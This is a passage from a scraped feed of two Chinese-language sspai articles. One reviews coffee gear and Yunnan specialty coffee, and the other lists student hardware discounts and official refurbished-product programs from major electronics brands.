Hario 的 V60。经典的设计、庞大的市场存量让它有了极高的可玩性与交流空间。但它可能不是对新手最友好的一个滤杯，高可玩性同时带来了多个变量，在刚上手时难以把控。</p>\n<p>泰摩与明谦合作的冰瞳滤杯则是一种变体 V60，它的肋骨与正常的 V60 不同。V60 的肋骨是贯穿整个滤杯的，另有零星的短肋骨在滤杯顶部加快流速，这样一致的设计可以帮助进阶人群设计更加多样的冲煮方案。而冰瞳的肋骨分三段，透气面积各不相同，对新手也更加友好。在浸湿滤纸后，整体滤纸贴合度也很棒，强迫症患者大大满足。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jejvlb34t99b7ntf6g.jpeg\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jek0db34t9abj2c7ng.jpeg\" alt=\"\"></figure><p>在推荐粉量下，你可以当作它是一个流速更加稳定的 V60 使用，一刀流的出品就十分平衡、顺滑；如果在小滤杯内使用大粉量，由于上两段肋骨更多、下水更慢，整体偏向浸泡，可以解锁更多玩法。</p>\n<h2>星粒手压意式咖啡机</h2>\n<p>在平常，你需要使用专门的意式机提供 9 Bar 以上的压力、较细研磨度的咖啡粉，才能获得一杯 Espresso，对于家庭用户来说是一笔不小的一次性花销。星粒 3 手压意式咖啡机则可以使用更粗的研磨度（类似摩卡壶）、不插电、甚至不需要热水，就可以获得一杯「像样」的 Espresso，进而制作美式、Dirty、拿铁等饮品。星粒 3 的价格也很友好，官方售价只需要 ￥598，如果在其他渠道价格还可能「腰斩」，如此高的性价比，也难怪能成为豆瓣咖啡组新宠啦。</p>\n<figure class=\"ss-imgRows\" figcaption=\"星粒 3 手压意式咖啡机 | 图源：星粒官网、作者\"><img src=\"https://cdn.sspai.com/editor/u_/c4jek0tb34t9a5fkks9g.png\" alt=\"\"><img src=\"https://cdn.sspai.com/editor/u_/c4jek15b34t9abj2c7o0.jpeg\" alt=\"\"></figure><p>星粒 3 能达到 15~20 Bar 压力，在手动萃取中更占优势。它不像韩国的 Kompresso 那样单纯靠手压，而是内部有一个多重加压系统，通过该系统达到四两拨千斤的效果，不需要使上「吃奶的力气」即可压出一杯浓缩。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/editor/u_/c4jek1lb34t9arh0b380.png\"><figcaption>原理图 | 图源：天猫星粒旗舰店</figcaption></figure><p>在翻阅了豆瓣咖啡组并自己试验之后，我得出的星粒 3 的建议萃取参数如下：</p>\n<ul>\n<li>研磨：摩卡壶粗细</li>\n<li>粉量：17-20g，烘培度越浅，粉量越多</li>\n<li>按压节奏<ul>\n<li>加入热水至最高水位线，旋好盖子</li>\n<li>下压 15 次，第 15 次时保持压杆压下状态 15 秒</li>\n<li>抬起压杆，再次下压 15 次</li>\n</ul>\n</li>\n</ul>\n<p>经过多次实验后发现：这样按压的节奏，萃取粉液比恰好落在 1:1.8 - 1:2 区间内，没有明显的尖酸与过萃的苦涩味。</p>\n<p>它的优缺点十分鲜明：</p>\n<p>优点：</p>\n<ul>\n<li>价格低廉、出品质量高</li>\n<li>可以提供 15 ~ 20 Bar 的压力，因此可以使用冷水温、更粗的研磨进行萃取</li>\n</ul>\n<p>缺点：</p>\n<ul>\n<li>部件多、正反标识不清，清洗与组装有一定难度</li>\n<li>使用非标准 53-54mm 粉碗，难以购置配件（接粉器 54mm，粉锤 53mm）</li>\n<li>压力、粉粗细等与标准意式机均不同，难以交流萃取参数</li>\n</ul>\n<p>在一开始筹划这个选题的时候，星粒就在我的名单上，但其公司主体（深圳市星粒文化传播公司）和官网（标示的联系地址是香港）具有很大的迷惑性。经过询问，品牌方表示星粒是中国品牌，总部位于深圳。而淘宝旗舰店的发货地位于广东佛山，佛山也是国内众多咖啡机、早餐机等小家电的产地。与之类似的，1Zpresso 也是国产手压意式机的翘楚，拥有相类似的产品线，有兴趣的朋友可以自行对比、选购。</p>\n<h2>结语</h2>\n<p>精品咖啡国产化意味着什么？不管是进口生豆还是云南小粒咖啡，消费者能拿到更新鲜、更稳定的产品。国内市场进一步壮大后，云南咖啡也必将有新的一块发展空间，精品化的国产豆更是能在探索中不断发展，逐步赶上国际行业的步伐。</p>\n<p>云南位于咖啡最佳的种植带，但由于作物锈病与经济效益的原因，当地种植的大多是 Arabica 与 Robusta 的杂交种卡蒂姆。该品种产量高、对环境的适应能力强，风味上却比其他 Arabica 种更加尖酸、苦涩，尾韵有大酱的味道。为了掩盖这种风味上的先天缺陷，云南产区也在积极探索特殊处理法，以中和这种「魔鬼的尾韵」。</p>\n<p>但这种现象正在改变。我曾喝过最惊艳的云南豆是鱼眼儿咖啡与产区合作的云南小贡柑水洗。特殊处理法完全没有带来奇怪的味道，反而不酸、不涩、不苦，甜感优秀，有一股清新且具象的芦柑风味。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/26/31e637a4c20d27431f930fdfdebb8f5d.jpg\"></figure><p>这样的精品咖啡才是未来发展的趋势。对云南整个产区来说，精品咖啡比普通商业豆的收购价高是常态。这些精品豆逐渐被市场认可，云南当地的农户也在根据消费者的反馈加强种植管理、探索更先进的处理方式。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jek2db34t9abj2c7og.jpeg\"><figcaption>各产区风味描述 | 图源：炬点咖啡</figcaption></figure><p>除了上文提到的熟豆企业之外，在云南当地，还有不少咖啡人正为咖农的福利与云南产区的发展努力。例如，操着一口流利普通话的 Martin Pollack 在云南创办了炬点咖啡，国内仅该企业有 CQI Q-grader Instructor 在职，他们也曾担任电影《一点就到家》的专业指导。炬点咖啡长期在云南与当地农户、处理厂合作，生产出品质更高的精品咖啡投入市场，形成可持续发展的循环，让农户也能在精品咖啡的浪潮中获益。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c4jek35b34t9a5fkksa0.png\"><figcaption>图源：炬点咖啡</figcaption></figure><p>现在，越来越多的熟豆销售企业开始在云南经营自有庄园，保山佐园就是一个很好的例子。佐园产销的咖啡生豆大多是精品豆种，如卡蒂姆蜜处理、水洗、日晒，铁皮卡，云南耶加雪菲等。其中，云南耶加雪菲是明谦咖啡与佐园合作后，明谦咖啡的蔡先生将耶加雪菲原生种带回国内，在佐园种植。如今，佐园年产量近十吨，生豆流向明谦、星巴克甄选、黑钻等品牌。同样的咖啡企业在云南还有很多，例如斑马庄园、孟连天宇合作社等，都在为当地产业的发展出力。</p>\n<p>农业不像其他产业，它的行业周期长、资金周转率低、生产效率高，收成的好坏还要看老天赏不赏脸。上世纪末，云南当地曾大规模爆发过咖啡树叶锈病，对当地农业发展造成了很大的影响。近年来，也有很多农户因为经济效益不好，将咖啡树砍掉改种豆角等经济农作物，这样的举措也不免让一众咖啡人叹息。所幸，云南农科院内，历经 30 年培育出的<a href=\"https://www.bilibili.com/video/BV1P64y1y7zb\" target=\"_blank\">下一代云南咖啡品种萨奇姆</a>即将进入投产阶段。相信在未来，市场上将会有更多叫好又叫座的云南咖啡。</p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68475"},{"title":"开学季 | 精打细算还是一步到位？不妨先看看这些硬件优惠","date":"2021-08-27 07:25:42","description":"\n<p>新学期，新气象，对即将进入新的环境继续深造的学生党们来说，一款趁手的新硬件或许更能激励自己奋发图强，至少让自己心情更愉悦，开开心心迈进校园。不过，摆在大部分学生面前的首要购买考虑因素，可能还是「价格」，毕竟自己还没有稳定收入来源，节约预算才是长久之道。</p>\n<p>幸运的是，大部分品牌都会针对教育市场推出长期专属优惠，开学季更是活动扎堆的时节。少数派此前已介绍过软件订阅、电商平台、生活服务等虚拟商品的学生福利，今天，我们不妨梳理一下硬件厂商的相关优惠，帮助大家以满意的价格买到心仪的产品。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/68227\" target=\"_blank\">开学季 | 这些软件和服务的教育优惠，能帮你省下不少钱</a></p>\n<h2>一步到位，新款也有好价格</h2>\n<h3>Apple</h3>\n<ul>\n<li>🧑‍🎓 权益：全系硬件折扣，限时赠送 AirPods</li>\n<li>🧾 认证方式：学生证等有效身份证件</li>\n<li>🔗 直达链接：<a href=\"https://apple.pvxt.net/XVxjy\" target=\"_blank\">Apple 官网</a> / <a href=\"https://apple.world.tmall.com/shop/view_shop.htm\" target=\"_blank\">天猫旗舰店</a>\n</li>\n</ul>\n<p>每年秋季学期前夕，Apple 都会推出 Apple Store 教育商店新学期优惠活动，今年也不例外。9 月 27 日前，在线上或 Apple Store 零售店购买指定机型，即可获赠价值 1246 元的基础款 AirPods，亦可补差价升级为配备无线充电盒型号或 AirPods Pro，分别需要 312 元与 753 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/10aa11d12a9c628fee69ad1e6766da04\"></figure><p>参与赠送 AirPods 的官网在售机型包括全系列 MacBook、全系列 iMac、Mac Pro、Mac mini、iPad Pro 和 iPad Air。第八代 iPad 和 iPad mini 不参与活动，下单时请留意网页说明，满足条件的型号会在购买页面出现横幅提示。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/1038ec84d293e153700ed55227c94adf.png\"></figure><p>新学期活动之外，Apple Store 教育商店提供的常态折扣依然有效。购买 Mac、iPad 以及 Apple Pencil、iPad 智能键盘等配件均有不同程度的优惠，整体来看，原价越高，优惠幅度越大。通过教育优惠购买的设备可享受最高 3 期分期付款服务，加购 AppleCare+ 服务计划享受 8 折优惠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/694577daa1ee494899819e8b39257aa3\"></figure><p>虽然名为学生优惠，但有资格的购买人包括在读和新录取的高校学生及其家长，以及幼儿园至高等院校的各级教师和教职员工。在线购买时，Apple 可能会在提交订单后向你的邮箱发送一封验证邮件，按照邮件说明，提供学生/教职员工证副本即可。在 Apple Store 零售店购买时，则需出示可证明教育资格的相关证件及身份证，家长需出示子女证件。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/67634\" target=\"_blank\">买 iPad、Mac 送 AirPods，Apple 新学期优惠活动开始了</a></p>\n<h3>微软</h3>\n<ul>\n<li>🧑‍🎓 权益：Surface 硬件 9 折起，指定机型 1 元加购配件</li>\n<li>🧾 认证方式：.edu.cn 教育邮箱 / 学信网</li>\n<li>🔗 直达链接：<a href=\"https://www.microsoftstore.com.cn/student\" target=\"_blank\">微软官方商城</a>\n</li>\n</ul>\n<p>微软官网的 Surface 开学季优惠活动截至 9 月 12 日，Surface Pro 7、Surface Laptop 4、Surface Book 3、Surface Studio 2 等在售机型均享受 9 折优惠，叠享 24 期免息分期及 30 天价格保护。部分指定型号另可加 1 元换购价值 636 元的 Surface 触控笔或价值 609 元的 Surface Arc 鼠标，折抵券二选一，不可兼得。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/55cbb8afa6b0c19f15ac7a1c0efb7928.png\"></figure><p>微软教育优惠的适用人群包括在读和新录取的高校学生，以及任职于大专及大专以上院校的教职员工。进入官网教育专区后，登录自己的微软账户，按页面提示通过 .edu.cn 教育邮箱或学信网完成资质认证，即可以优惠价格购买 Surface 硬件。教育邮箱认证有效期为一学年，立即生效；学信网认证有效期截至毕业所在年份的 6 月 30 日，需要 1–3 个工作日完成审核。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/f011ccf4acbcb0c85055345724a764ba\"></figure><h3>三星</h3>\n<ul>\n<li>🧑‍🎓 权益：指定机型 9 折起，加赠腾讯视频会员等</li>\n<li>🧾 认证方式：学信网 / 高校录取通知书</li>\n<li>🔗 直达链接：<a href=\"https://www.samsungeshop.com.cn/activitys/StudentPurchase\" target=\"_blank\">三星网上商城</a>\n</li>\n</ul>\n<p>中国三星同样推出了「星助力」学生专享优惠活动，涵盖 Galaxy S、Note、A、Fold、Flip 等系列智能手机，以及平板电脑、智能手表、无线耳机、存储设备等众多品类，最高优惠可达 3000 元，享受 12 期免息分期及优惠换屏服务，加赠腾讯视频 VIP 会员季卡。依订单金额，还可额外获取最高价值 188 元的三星积分，用于兑换实物礼品或优惠折抵券等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/e15ff58d1958582b2a0639e58a5c062e\"></figure><p>已满 18 周岁的在读高校学生及新录取的高考生均可享受「星助力」优惠，进入活动页面，选购心仪商品并支付后，按提示将学信网验证码或高校录取通知书照片提供给商城客服，验证通过后订单发货，如未符合条件，订单会自动取消，每个三星账户每月限购一台。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/77f8fdc9da649e8bb96409db44d52be7\"></figure><h3>华为</h3>\n<ul>\n<li>🧑‍🎓 权益：指定机型折扣，限量优惠券，抽奖活动等</li>\n<li>🧾 认证方式：.edu.cn 教育邮箱 / 学生证等有效身份证件</li>\n<li>🔗 直达链接：<a href=\"https://sale.vmall.com/educationcenter.html\" target=\"_blank\">华为商城</a>\n</li>\n</ul>\n<p>华为商城的开学季活动截至 9 月 10 日，涵盖智能手机、平板电脑、智能硬件、日用百货等品类，优惠幅度不等，最高可享 200 元优惠或 3 期免息分期。8 月 31 日前，每天 10:00 与 16:00 限量发放最高 168 元的返校券，每个账户限领一张。活动期间可参与「开学拼拼乐」游戏，有机会获得不锈钢保温杯等奖品；成功购机可按照系统提示参与抽奖，最高奖为国内任意飞机票一张。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/b4b41d4467884558fd43b677ceb2ad72.png\"></figure><p>华为商城的教育优惠面向在读高校学生、应届高考毕业生与拥有教师资格证的教职员工。活动期间，进入商城页面，按提示上传相关身份证件信息，等待审核通过；或直接将自己的华为账户邮箱地址修改为 .edu.cn 教育邮箱，即可领取并使用教育专属优惠券，具体优惠幅度以订单页面为准。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/32e1d32d8ef31ca75aa7bb1064a9a401\"></figure><h3>小米</h3>\n<ul>\n<li>🧑‍🎓 权益：小米商城品类优惠券</li>\n<li>🧾 认证方式：学信网或 .edu.cn 教育邮箱</li>\n<li>🔗 参与方式：小米商城 App</li>\n</ul>\n<p>小米教育优惠截止时间为 8 月 31 日，你可以在小米商城 App 首页顶部的横幅 banner 中找到入口。活动以派送小米商城各品类产品优惠券为主，填写基本信息就能获得共计 170 元的优惠券三张，通过学信网在线认证或 EDU 邮箱认证后则能获得共计 1069 元的优惠券 9 张。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/08/27/a03c52834ea07d599ada664f18d5d81e.jpg\"></figure><p>这些优惠券可用于购买的产品也不少，从小米当前主推的小米手机、笔记本电脑、显示器到米家生活小电器，可谓应有尽有，所以即便你已经添置了必要电子产品，也可以在这里领优惠券捡捡漏。</p>\n<figure class=\"ss-imgRows\" figcaption=\"\"><img src=\"https://cdn.sspai.com/2021/08/27/dedf76714e4c077a2fcbd1b53102e177.jpg\" alt=\"\"><img src=\"https://cdn.sspai.com/2021/08/27/18ae4c9c8ba678d7f0f56e2039bdd711.jpg\" alt=\"\"></figure><h3>一加</h3>\n<ul>\n<li>🧑‍🎓 权益：OnePlus 8 系列 50 元优惠</li>\n<li>🧾 认证方式：.edu.cn 教育邮箱</li>\n<li>🔗 直达链接：<a href=\"https://www.oneplus.com/cn/education\" target=\"_blank\">一加官网</a>\n</li>\n</ul>\n<p>一加教育优惠适用于选购 OnePlus 8 和 OnePlus 8 Pro 两款手机，暂不包括其它手机型号、配件和周边产品等。通过认证的用户可领取 50 元面额的定向优惠券，有效期为 30 天，每个一加账户一年内同一类商品仅可享受一次教育优惠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/2480f6747f29a46f73aacf93ab546787.png\"></figure><p>大专及大专以上的在读高校生、教师、教职员工，均有资格享受一加教育优惠。登录自己的一加账户后，在「个人中心 - 教育优惠」板块绑定验证 .edu.cn 教育邮箱，即可在「我的资产」中查收并使用优惠券。认证有效期为一年，在教育邮箱有效的情况下，次年可重新认证并领取教育折扣。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/ecf1c68f12ecafab3f7c89aa256dc7fe\"></figure><h3>OPPO</h3>\n<ul>\n<li>🧑‍🎓 权益：学生价，专属优惠券等</li>\n<li>🧾 认证方式：学信网</li>\n<li>🔗 直达链接：<a href=\"https://pro.jd.com/mall/active/4RhC5ucewNaNk5QCinJoL6FcVWHu/index.html\" target=\"_blank\">OPPO 京东自营官方旗舰店</a>\n</li>\n</ul>\n<p>OPPO 教育优惠覆盖 Find X3 Pro、Reno6 系列等部分手机型号，及 OPPO Watch 2、OPPO 手环、Enco 系列真无线耳机等智能配件，单品最高优惠 250 元，还可领取最高 100 元专享优惠券，叠加使用。学生用户可在京东的个人中心内按提示完成学生认证，通过后前往 OPPO 旗舰店享受优惠。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/article/e383982a51acee9db948083ad0d6f0eb\"></figure><h3>vivo</h3>\n<ul>\n<li>🧑‍🎓 权益：专属折扣，最高 24 期免息分期等</li>\n<li>🧾 认证方式：学生证等有效身份证件</li>\n<li>🔗 直达链接：<a href=\"https://topic.vivo.com.cn/activity/link/xues\" target=\"_blank\">vivo 官方商城</a>\n</li>\n</ul>\n<p>vivo 官方商城的学生优惠活动截至 8 月 31 日，涵盖 X、S、Y 系列手机和 iQOO 子品牌，以及智能手表、无线耳机、游戏手柄、充电器等各类配件。活动产品均提供学生专属价格，折扣力度不一，还可叠加最高 24 期手机免息分期券及最高 5 折指定配件券，部分机型另有定制双肩包、耳机等赠品，详情请参考具体商品页面介绍。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/f1eb3942debc2b99c047282f67457165.png\"></figure><p>vivo 学生优惠面向教育部录入学校的全日制大专及以上学历的在籍学生和持有本年高考准考证的高中生，登录 vivo 账户，按页面提示输入自己的真实姓名、身份证号码、入学时间等个人信息，审核通过后即可享受专属优惠。需要注意的是，学生认证页面在 PC 端无法加载，请使用手机访问，或修改浏览器 UA 后刷新重试。</p>\n<h3>戴尔</h3>\n<ul>\n<li>🧑‍🎓 权益：专属折扣，定制礼品等</li>\n<li>🧾 认证方式：学生证等有效身份证件</li>\n<li>🔗 微信小程序码：<a href=\"https://spp.dell-brand.com/2018/wx.jpg\" target=\"_blank\">戴尔学生优选商城</a>\n</li>\n</ul>\n<p>在中国大陆，戴尔校园业务已全面迁移至「戴尔学生优选商城」微信小程序，你可以扫描上方小程序码，或打开微信搜索进入。戴尔灵越轻薄本、XPS 超极本、G 系列电竞本及戴尔原装配件、外星人 Alienware 游戏外设等部分型号提供学生折扣，另有限量周边赠品、优惠延保服务、晒单返利、抽奖活动等。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/27/b13e71349f74f632ade2d44ec8e0af67.png\"></figure><p>打开小程序后，按界面引导，通过微信授权登录，上传含有院校名称与姓名的学生证、录取通知书等有效证件照片，审核通过后即可享受戴尔学生会员权益。报名申请「戴尔校园大使」还可获得更多福利，包括戴尔实习证明、奖金等。</p>\n<h3>联想</h3>\n<ul>\n<li>🧑‍🎓 权益：专属优惠券，12 期免息分期等</li>\n<li>🧾 认证方式：学生证等有效身份证件</li>\n<li>🔗 直达链接：<a href=\"https://activity.lenovo.com.cn/tsyx/k12.html\" target=\"_blank\">联想商城</a>\n</li>\n</ul>\n<p>联想的学生优惠覆盖 Lenovo、ThinkPad、小新、拯救者等品牌，包括笔记本电脑、一体机、平板电脑、智能手机、打印机、外设配件等品类。通过学生认证后，即可领取专属优惠券礼包，用于购买指定产品，另可享受 12 期免息分期，转盘抽取奖品。购买电脑还可获赠价值 199 元的「一指学院」课程兑换卡，学习 Office 等实用技能，考试达标颁发电子证书。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/425d064d5a96a9789dfe3c73420f04c7.png\"></figure><p>联想的学生优惠面向小学至大学的各阶段在校学生，按页面指引提交姓名、手机号、有效身份证件等个人信息后，等待 2–3 工作日审核通过，即可在自己的联想账户中收到学生专属优惠券礼包，可在「我的优惠券」板块查看并使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/article/c95760849642ad979bab317e7d933faf\"></figure><p>此外，Lenovo 为海外学生及教职员工提供 <a href=\"https://www.lenovo.com/us/en/landingpage/students-and-teachers/\" target=\"_blank\">范围更广的教育优惠</a>，通过 ID.me 第三方认证后，可以享受 95 折购买全站所有在售商品。Google、惠普、戴尔、宏碁等多数主流厂商均提供类似优惠，如果你是海外留学生，不妨自行搜索了解。</p>\n<h2>精打细算，官翻更是实惠之选</h2>\n<p>提起「官翻」，你可能会首先想到「二手」。但与鱼龙混杂的二手交易平台相比，由厂商官方回收，经过严格检测与维修的官翻设备，质量显然更有保障，通常还提供与新机一致的有限保修服务，物美价廉。对囊中羞涩的学生党来说，甚至可能比教育优惠更划算。</p>\n<h3>Apple 认证的翻新产品</h3>\n<p>🔗 直达链接：<a href=\"https://www.apple.com.cn/shop/refurbished\" target=\"_blank\">Apple Store</a></p>\n<p>Apple 认证的翻新产品主要包括 Mac、iPad 和 Apple Watch，有时也会上架清仓产品和 Apple Pencil 等配件，iPhone 较为少见。官方翻新设备多半来自保修期内出现故障的返厂机器，也包括通过 Apple Trade In 换购计划回收的旧机型等，替换新零件、彻底清洁并更换电池和外壳后再次销售。官翻设备的外观和体验与新机相仿，享受一年有限保修服务以及最长达 90 天的免费技术支持，还支持加购 AppleCare 服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/f3a613b9a91836b8c6f95928a87fe272.png\"></figure><p>在价格方面，大部分 Apple 认证的翻新产品定价均低于新机 20% 左右，同样低于同型号使用教育优惠后的价格，如果不需要 AirPods，性价比更高。以配备 Apple M1 芯片、8 GB 内存、512 GB 固态硬盘的 13.3 英寸 MacBook Pro 为例，官翻定价为 9769 元，可享 24 期免息分期，同款的教育商店定价则为 10699 元，降幅近 1000 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/2344c3965ddb9ff5e8c1ea1d19ed2494.png\"></figure><h3>微软认证翻新 Surface</h3>\n<p>🔗 直达链接：<a href=\"https://www.microsoftstore.com.cn/hardware/surface/refurbishedsurface\" target=\"_blank\">微软官方商城</a></p>\n<p>微软认证翻新 Surface 的来源与 Apple 相仿，每台翻新设备均经过严苛的处理流程，由专业员工精心检测和细致翻新，包括硬件损坏修复和外观品质检查，加上安全的数据擦除、软件升级和诊断测试，经过校调并重新安装 Windows 操作系统和软件更新后上架销售。翻新设备享有两年有限硬件质保，退换货政策也与新机相同，支持 Microsoft Complete 服务计划或 Microsoft Plus 延保服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/fa1c2e28dc528394f605954932d1e3d5.png\"></figure><p>微软认证翻新 Surface 定价约为新款的 75 折，不同配置的优惠力度不等，配备酷睿 i7、16 GB 内存、1 TB 固态硬盘的 Surface Pro 7 差价可达 3500 元。不过，在微软官方商城，目前大部分翻新型号均显示缺货，仅有部分旧款仍有库存。考虑到开学季活动正在赠送配件，直接通过教育优惠购买也是好选择。</p>\n<p> </p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/53af76c92fef1bc5eb5ed88b2f44fdcf.png\"></figure><h3>三星官方翻新机</h3>\n<p>🔗 直达链接：<a href=\"https://mall.jd.com/index-718072.html\" target=\"_blank\">京东三星官翻手机旗舰店</a></p>\n<p>三星官方翻新机是中国三星通过官方渠道回收，检测维修后再次上架销售的智能手机、手表、耳机等，均在后盖激光镌刻字母与新机区分，共有三种版本：7D 版来自消费者 7 天无理由退货，S 版来自 15 天无理由换货，经检测正常，重新塑封上架；R 版与 Apple 官翻设备类似，包括实体店展示机、质量问题退换、以旧换新回收等，由三星工厂全面维修、翻新和检测后再次销售。三种版本的官翻机品质均与新机无异，享受一年保修，支持 7 天无理由退货。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/618c6da0daf8256cfc60f615671c29d5.png\"></figure><p>在中国大陆地区，三星官方翻新机的线上销售渠道为京东「三星官翻手机旗舰店」，不同版本的定价不一致，7D 版最贵，约为新款 85 折，可叠加其它优惠券；店铺内另有出厂检测性能完好、外观存在瑕疵的「资源机」出售，标注成色，价格最低，95 新的 256 GB 存储空间 Galaxy S21+ 5G 定价 4999 元，比教育优惠低 1000 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/f049537267c11cb34d4899aa63aad586.png\"></figure><p>三星官翻手机旗舰店还提供手机翻新服务，下单后联系店铺客服，按要求将旧手机邮寄至指定地址，三星工厂会按官翻标准检测更换屏幕、电池、后盖等组件，作为备用机或转赠家人都更舒心。</p>\n<h3>华为认证二手机</h3>\n<p>🔗 直达链接：<a href=\"https://www.vmall.com/list-1008\" target=\"_blank\">华为商城</a></p>\n<p>严格来说，华为认证二手机并非官方翻新手机，而是由华为认证合作伙伴回收的二手产品，由第三方自行翻新，经过华为官方的严格质量和功能检测，保证产品功能和性能符合华为标准，虽然上架华为商城销售，但由合作商负责发货。华为认证二手机均装配全新原装电池，搭载 HarmonyOS 2，享受一年质保，分为 99 新与 9 成新两种成色。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/f6a5c582177f487ce929dd68a199784f.png\"></figure><p>华为认证二手机的定价较高，只比新机略低，也没有最新型号。为减少电子产品对环境的负担，华为认证二手机只包含手机裸机，没有充电器、充电线、耳机等其它配件，更推荐有情怀、想要支持环保事业且已经有相关配件的同学购买。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/a25116bd97af5a87080a695228838fae.png\"></figure><h3>佳能官方认证翻新品</h3>\n<p>🔗 直达链接：<a href=\"https://shop.canon.com.cn/prolist?category_id=166\" target=\"_blank\">佳能官方线上商城</a></p>\n<p>佳能官方认证翻新品主要源自电商平台七天无理由退货、未进入消费领域的经销商退货产品等，主要部件未经过维修，经过清洁、调整、更换零部件和固件升级等操作，通过佳能严格的质量检测，各项性能正常，可以正常使用，享受一年免费维修。翻新机可能存在不影响基本功能的轻微外观划痕、镜头内灰尘和 LCD 亮点等，不包含在保修范围内。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/2383e09f7fc2e31555e658386a35e7e5.png\"></figure><p>佳能官方认证翻新品包括相机套机、机身、镜头、配件等，优惠幅度依具体型号而定，最高可达新机定价的 20% 以上，以 EOS 5D Mark IV 机身为例，官翻定价 13999 元，新机定价则为 19049 元，差价达到 5000 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/3c86a4ae634b93f2eb4bdcef5f6a6b72.png\"></figure><h3>富士次新品</h3>\n<p>🔗 直达链接：<a href=\"https://shop112456280.taobao.com/\" target=\"_blank\">淘宝授权经销商 1</a> / <a href=\"https://shop60218393.taobao.com/\" target=\"_blank\">经销商 2</a> / <a href=\"https://wuxiaohua1230.taobao.com/\" target=\"_blank\">经销商 3</a> / <a href=\"https://mall.jd.com/view_search-718269-15706354-99-1-20-1.html\" target=\"_blank\">京东授权经销商</a></p>\n<p>富士次新品指的是线上渠道销售出的全新正品行货，因七天无理由政策而退回的产品。由富士官方重新收回、严格质检、翻新处理后再次封装上市，通过官方授权经销商代理销售，可能存在轻微划痕等瑕疵。富士次新品包装外贴有富士公司的一次性封条，可通过电话查询机身号，享受官方 12 或者 18 个月全国联保，不支持注册延保和无理由退换货。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/ba1af57fca1f3eae5d8ed563eaac6d47.png\"></figure><p>富士次新品在中国大陆仅通过官方特许线上渠道代理销售，目前的授权经销商包括三家淘宝店铺与一家京东店铺，涵盖相机机身、镜头和配件等，价格比较划算。如富士 XT-3 单机身官翻定价 7099 元，新款定价则为 8990 元，优惠近 2000 元。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/f9da45a1e5528657169eceeccf8aaa51.png\"></figure><h3>京东拍拍优品</h3>\n<p>在国内，许多无暇经营自有渠道的品牌会指定京东作为官方翻新产品的线上代理经销商，如 <a href=\"https://mall.jd.com/index-634576.html\" target=\"_blank\">戴尔授权智选官翻机专卖店</a> 对应境外的 <a href=\"https://www.dell.com/en-us/dfh/shop/dell-refurbished/cp/outlet\" target=\"_blank\">Dell Outlet</a>、<a href=\"https://mall.jd.com/index-710727.html\" target=\"_blank\">联想 ThinkPad 官翻授权旗舰店</a> 对应境外的 <a href=\"https://www.lenovo.com/us/en/outletus\" target=\"_blank\">Lenovo Outlet</a> 等。<a href=\"https://2.jd.com/\" target=\"_blank\">京东拍拍优品</a> 汇聚了绝大部分此类官翻硬件，还包括大量二手产品，涵盖手机、电器、图书、家居、鞋服、奢侈品等品类，由京东官方担保，提供以旧换新等服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/25/5b740af30eed352893483fe8894d97f5.png\"></figure><h3>Amazon Renewed</h3>\n<p>Amazon 